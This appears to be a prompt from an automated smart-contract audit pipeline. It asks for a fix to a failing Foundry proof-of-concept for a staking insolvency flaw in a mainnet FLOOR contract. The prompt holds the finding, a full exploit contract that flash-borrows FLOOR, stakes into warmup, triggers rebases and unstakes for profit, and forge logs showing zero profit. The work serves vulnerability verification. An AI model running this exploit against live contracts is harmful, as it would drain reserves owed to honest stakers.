You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Warmup deposits are rebased but never counted as liabilities, allowing staking insolvency
- claim: `stake()` transfers FLOOR into the contract and records warmup positions as `deposit` plus `gons`, while `claim()` later pays `sFLOOR.balanceForGons(info.gons)`, so warmup balances continue to appreciate with rebases. However, `rebase()` computes distributable surplus from `FLOOR.balanceOf(address(this)) - sFLOOR.circulatingSupply() - bounty` and never subtracts `gonsInWarmup` or `supplyInWarmup()`. Warmup-backed FLOOR is therefore treated as free excess reserves and redistributed to current stakers even though it is still owed to warmup claimants.
- impact: Large warmup balances can make the system undercollateralized. After one or more rebases, the contract can owe more sFLOOR/gFLOOR/FLOOR than it holds backing for, causing honest claimants or unstakers to receive unbacked positions or hit `unstake()` reverts due to insufficient FLOOR reserves.
- exploit_paths: ["Set `warmupPeriod > 0` and let some users already hold active staking positions.", "A user stakes FLOOR into warmup, increasing `gonsInWarmup` but not `sFLOOR.circulatingSupply()`.", "When `rebase()` runs, the newly deposited FLOOR is included in `balance` and treated as surplus because warmup liabilities are not subtracted.", "Existing stakers receive that value through rebases, while the warmup user still retains a claim for `sFLOOR.balanceForGons(info.gons)`.", "Total redeemable claims eventually exceed the contract's FLOOR backing, and withdrawals start failing."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IsFLOORLike is IERC20Like {
    function circulatingSupply() external view returns (uint256);
    function balanceForGons(uint256 gons) external view returns (uint256);
}

interface IgFLOORLike is IERC20Like {
    function balanceFrom(uint256 amount) external view returns (uint256);
}

interface IStakingLike {
    function FLOOR() external view returns (address);
    function sFLOOR() external view returns (address);
    function gFLOOR() external view returns (address);

    function warmupPeriod() external view returns (uint256);
    function supplyInWarmup() external view returns (uint256);
    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
    function warmupInfo(address account)
        external
        view
        returns (uint256 deposit, uint256 gons, uint256 expiry, bool lock);

    function stake(address to, uint256 amount, bool rebasing, bool claimNow) external returns (uint256);
    function claim(address to, bool rebasing) external returns (uint256);
    function unstake(address to, uint256 amount, bool trigger, bool rebasing) external returns (uint256);
    function rebase() external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    struct Claim {
        uint256 deposit;
        uint256 gons;
        uint256 expiry;
        bool lock;
    }

    struct FlashQuote {
        address pair;
        uint256 amountOut;
        bool floorIsToken0;
    }

    IStakingLike internal constant STAKING =
        IStakingLike(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bool private baselineCaptured;
    uint256 private baselineFloorBalance;
    uint256 private realizedProfitInFloor;
    address private activeFlashPair;

    constructor() {}

    function executeOnOpportunity() public {
        _captureBaseline();
        _approveSpenders();

        if (!_canExploitCurrentEpochState()) {
            _syncProfit();
            return;
        }

        uint256 localFloor = _floor().balanceOf(address(this));
        if (localFloor != 0) {
            _executeExploit(localFloor);
            _syncProfit();
            return;
        }

        FlashQuote memory quote = _bestFlashQuote();
        if (quote.pair == address(0) || quote.amountOut == 0) {
            _syncProfit();
            return;
        }

        activeFlashPair = quote.pair;
        IUniswapV2PairLike(quote.pair).swap(
            quote.floorIsToken0 ? quote.amountOut : 0,
            quote.floorIsToken0 ? 0 : quote.amountOut,
            address(this),
            abi.encode(quote.amountOut)
        );
        activeFlashPair = address(0);

        _syncProfit();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == activeFlashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed != 0, "no FLOOR borrowed");

        _executeExploit(borrowed);

        uint256 repayment = _v2Repayment(borrowed);
        require(_floor().balanceOf(address(this)) >= repayment, "flash repayment unavailable");
        _floor().transfer(msg.sender, repayment);
    }

    function profitToken() external view returns (address) {
        return STAKING.FLOOR();
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitInFloor;
    }

    function _executeExploit(uint256 floorFunding) internal {
        uint256 warmupPeriod = STAKING.warmupPeriod();
        if (warmupPeriod == 0 || floorFunding < 2) {
            return;
        }

        uint256 bootstrapAmount = floorFunding / 2;
        uint256 warmupAttackAmount = floorFunding - bootstrapAmount;
        if (bootstrapAmount == 0 || warmupAttackAmount == 0) {
            return;
        }

        // Path 0: keep the original finding assumptions. The exploit requires
        // warmupPeriod > 0 and some pre-existing active stake in sFLOOR.circulatingSupply().
        if (_sFloor().circulatingSupply() == 0) {
            return;
        }

        // Additional realistic public step: bootstrap a live staking position first,
        // so the attacker can receive the later warmup-backed rebase surplus as an
        // existing staker without changing the root cause.
        STAKING.stake(address(this), bootstrapAmount, true, false);
        _consumeImmediateRebases(warmupPeriod);

        try STAKING.claim(address(this), true) returns (uint256) {} catch {
            return;
        }

        uint256 activeSBalance = _sFloor().balanceOf(address(this));
        if (activeSBalance == 0) {
            return;
        }

        uint256 supplyInWarmupBefore = STAKING.supplyInWarmup();

        // Path 1: stake FLOOR into warmup. Staking.sol records a private
        // gonsInWarmup liability, but rebase() still ignores that liability.
        STAKING.stake(address(this), warmupAttackAmount, true, false);

        Claim memory info = _warmupInfo();
        if (info.gons == 0) {
            return;
        }

        // supplyInWarmup() is sFLOOR.balanceForGons(gonsInWarmup), so this confirms
        // the hidden warmup liability increased even though it is not counted in
        // sFLOOR.circulatingSupply() inside Staking.rebase().
        if (STAKING.supplyInWarmup() <= supplyInWarmupBefore) {
            return;
        }

        // Path 2: later rebases compute surplus from FLOOR.balanceOf(this) minus
        // sFLOOR.circulatingSupply(), so the warmup-backed FLOOR is redistributed to
        // current stakers even though it is still owed to the warmup claimant.
        _consumeImmediateRebases(warmupPeriod);

        info = _warmupInfo();
        uint256 claimableWarmup = _sFloor().balanceForGons(info.gons);
        if (claimableWarmup == 0) {
            return;
        }

        // Path 3: claim() later pays sFLOOR.balanceForGons(info.gons), so the attacker
        // keeps the rebasing warmup claim after active stakers already absorbed the
        // warmup-backed surplus.
        try STAKING.claim(address(this), true) returns (uint256) {} catch {
            return;
        }

        _approveSpenders();

        // Path 4: pull out as much FLOOR as the undercollateralized contract can still
        // honor. Once total claims outrun reserves, honest withdraw/unstake calls start
        // reverting with "Insufficient FLOOR balance in contract".
        _withdrawAsFloor();
    }

    function _canExploitCurrentEpochState() internal view returns (bool) {
        uint256 warmupPeriod = STAKING.warmupPeriod();
        if (warmupPeriod == 0) {
            return false;
        }

        if (_sFloor().circulatingSupply() == 0) {
            return false;
        }

        return _remainingImmediateRebases() >= _requiredImmediateRebases(warmupPeriod);
    }

    function _bestFlashQuote() internal view returns (FlashQuote memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory bases = [WETH, USDC, USDT, DAI];
        address floorToken = STAKING.FLOOR();

        uint256 activeSupply = _sFloor().circulatingSupply();
        uint256 capFromStrategy = activeSupply / 2;

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(floorToken, bases[j]);
                if (pair == address(0)) {
                    continue;
                }

                IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
                address token0 = v2Pair.token0();
                (uint112 reserve0, uint112 reserve1,) = v2Pair.getReserves();

                uint256 floorReserve = token0 == floorToken ? uint256(reserve0) : uint256(reserve1);
                if (floorReserve <= 1) {
                    continue;
                }

                uint256 amountOut = floorReserve / 4;
                if (capFromStrategy != 0 && amountOut > capFromStrategy) {
                    amountOut = capFromStrategy;
                }

                if (amountOut > best.amountOut) {
                    best = FlashQuote({pair: pair, amountOut: amountOut, floorIsToken0: token0 == floorToken});
                }
            }
        }
    }

    function _consumeImmediateRebases(uint256 count) internal {
        for (uint256 i = 0; i < count; ++i) {
            if (!_epochReady()) {
                break;
            }
            STAKING.rebase();
        }
    }

    function _withdrawAsFloor() internal {
        uint256 sBalance = _sFloor().balanceOf(address(this));
        if (sBalance == 0) {
            return;
        }

        uint256 stakingFloorReserves = _floor().balanceOf(address(STAKING));
        if (stakingFloorReserves == 0) {
            return;
        }

        uint256 amountToWithdraw = sBalance;
        if (amountToWithdraw > stakingFloorReserves) {
            amountToWithdraw = stakingFloorReserves;
        }
        if (amountToWithdraw == 0) {
            return;
        }

        try STAKING.unstake(address(this), amountToWithdraw, false, true) returns (uint256) {
            return;
        } catch {
            // If insolvency is already severe enough that even this withdraw path fails,
            // leave the state unchanged rather than fabricating profit.
        }
    }

    function _captureBaseline() internal {
        if (baselineCaptured) {
            return;
        }

        baselineCaptured = true;
        baselineFloorBalance = _floor().balanceOf(address(this));
    }

    function _approveSpenders() internal {
        _floor().approve(address(STAKING), type(uint256).max);
        _sFloor().approve(address(STAKING), type(uint256).max);
    }

    function _warmupInfo() internal view returns (Claim memory info) {
        (info.deposit, info.gons, info.expiry, info.lock) = STAKING.warmupInfo(address(this));
    }

    function _requiredImmediateRebases(uint256 warmupPeriod) internal pure returns (uint256) {
        unchecked {
            return (warmupPeriod + 1) * 2;
        }
    }

    function _remainingImmediateRebases() internal view returns (uint256) {
        (uint256 length,, uint256 end,) = STAKING.epoch();
        if (length == 0 || end > block.timestamp) {
            return 0;
        }

        return ((block.timestamp - end) / length) + 1;
    }

    function _epochReady() internal view returns (bool) {
        (, , uint256 end,) = STAKING.epoch();
        return end <= block.timestamp;
    }

    function _v2Repayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _floor() internal view returns (IERC20Like) {
        return IERC20Like(STAKING.FLOOR());
    }

    function _sFloor() internal view returns (IsFLOORLike) {
        return IsFLOORLike(STAKING.sFLOOR());
    }

    function _gFloor() internal view returns (IgFLOORLike) {
        return IgFLOORLike(STAKING.gFLOOR());
    }

    function _syncProfit() internal {
        uint256 currentFloorBalance = _floor().balanceOf(address(this));
        if (currentFloorBalance > baselineFloorBalance) {
            realizedProfitInFloor = currentFloorBalance - baselineFloorBalance;
        } else {
            realizedProfitInFloor = 0;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.59s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 131181)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xf59257E961883636290411c11ec5Ae622d19455e
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 5829

Traces:
  [131181] FlawVerifierTest::testExploit()
    ├─ [3447] FlawVerifier::profitToken() [staticcall]
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    ├─ [2468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [87082] FlawVerifier::executeOnOpportunity()
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   ├─ [468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   ├─ [24535] 0xf59257E961883636290411c11ec5Ae622d19455e::approve(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000759c6de5bca9ade8a1a2719a31553c4b7de02539
    │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   └─ ← [Return] true
    │   ├─ [307] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::sFLOOR() [staticcall]
    │   │   └─ ← [Return] 0x164AFe96912099543BC2c48bb9358a095Db8e784
    │   ├─ [24465] 0x164AFe96912099543BC2c48bb9358a095Db8e784::approve(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000759c6de5bca9ade8a1a2719a31553c4b7de02539
    │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   └─ ← [Return] true
    │   ├─ [2364] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::warmupPeriod() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   ├─ [468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [947] FlawVerifier::profitToken() [staticcall]
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    ├─ [319] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xf59257E961883636290411c11ec5Ae622d19455e)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18068772 [1.806e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 5829)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 51.16ms (10.30ms CPU time)

Ran 1 test suite in 63.00ms (51.16ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 131181)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
